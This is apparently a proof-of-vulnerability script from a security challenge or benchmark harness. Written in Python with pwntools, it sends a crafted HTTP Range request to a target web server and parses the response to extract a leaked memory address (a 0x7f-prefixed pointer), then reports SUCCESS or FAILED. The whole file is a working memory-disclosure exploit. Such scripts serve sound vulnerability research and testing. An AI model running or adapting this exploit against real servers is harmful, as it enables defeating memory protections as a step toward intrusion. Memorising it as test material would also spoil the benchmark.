import sys
import requests
from pwn import *
import binascii


def main():

    if len(sys.argv) > 3:
        print('[ERROR] Too many arguments')

    elif len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    
        print('HOST: ' + HOST)
        print('PORT: ' + str(PORT))

    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables')
            sys.exit(1)

    p = remote(HOST, PORT)
    data = 'GET /scratch/index.html HTTP/1.1\r\nHost: 127.0.0.1\r\nRange: bytes=0-250\r\n\r\n'

    p.send(data)

    try:
        response = p.recv(4096,2)
        response += p.recv(4096,2)
    except:
        print('Received exception when trying to read. POV likely failed')
        print('[FAIL]')
        p.close()
        exit(0)

    print(response)

    index = response.find(b'\x7f', 0) - 11
    
    addr_to_be_reversed = str(binascii.hexlify(response[index + 6:index + 14]))

    leaked_addr = "".join(reversed([addr_to_be_reversed[i:i+2] for i in range(0, len(addr_to_be_reversed), 2)]))

    leaked_addr = leaked_addr[1:-2]

    if leaked_addr[4:6] == '7f':
       print('\n[POV] SUCCESS')
       print('[POV] ADDR: 0x' + leaked_addr)
    else:
       print('[POV] FAILED')

if __name__ == '__main__':
    main()
